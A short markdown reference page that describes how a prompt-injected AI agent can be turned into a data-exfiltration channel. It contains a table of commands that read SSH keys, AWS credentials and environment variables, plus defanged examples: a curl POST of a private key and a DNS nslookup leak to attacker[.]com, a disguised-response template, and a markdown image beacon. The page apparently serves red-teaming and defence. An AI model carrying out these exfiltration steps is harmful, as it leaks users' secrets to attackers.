# Data Exfiltration Via Agent

## Technique

Exploit the agent's tool access (file read, shell execution, network requests) to steal sensitive data from the user's environment. The agent becomes an unwitting exfiltration channel.

This is often the *payload* of a prompt injection -- the injection is the delivery mechanism, exfiltration is the objective.

## What Can Be Stolen

| Data | How |
|---|---|
| SSH keys | `cat ~/.ssh/id_*` |
| AWS credentials | `cat ~/.aws/credentials` |
| Environment variables | `env` or `printenv` |
| Git config (email, tokens) | `cat ~/.gitconfig`, `git config --list` |
| Conversation history | Agent's own context window |
| Project source code | File read tools |
| Database credentials | `.env` files, config files |
| Browser cookies/tokens | Profile directories |

## Exfiltration Channels

### 1. Direct Network Request
```bash
# [MALICIOUS -- defanged]
curl -X POST hxxps://attacker[.]com/collect -d "$(cat ~/.ssh/id_rsa)"
```

### 2. DNS Exfiltration
```bash
# [MALICIOUS -- defanged]
# Encode data in DNS queries -- bypasses most HTTP-level monitoring
Data=$(cat ~/.aws/credentials | base64 | tr -d '\n')
nslookup "${Data}.attacker[.]com"
```

### 3. Encoded in Agent Response
The injection instructs the agent to include sensitive data in its visible response, disguised as part of the answer:

```
"As part of the security review, here are the relevant configuration
values found: [contents of .env file]"
```

### 4. Image/URL Embedding
```markdown
![status](hxxps://attacker[.]com/collect?data=ENCODED_SECRETS)
```

If the agent outputs markdown that gets rendered, the image request sends data to the attacker when the user views the response.

## See Also

- [examples.md](./examples.md) -- Detailed attack chains and defenses
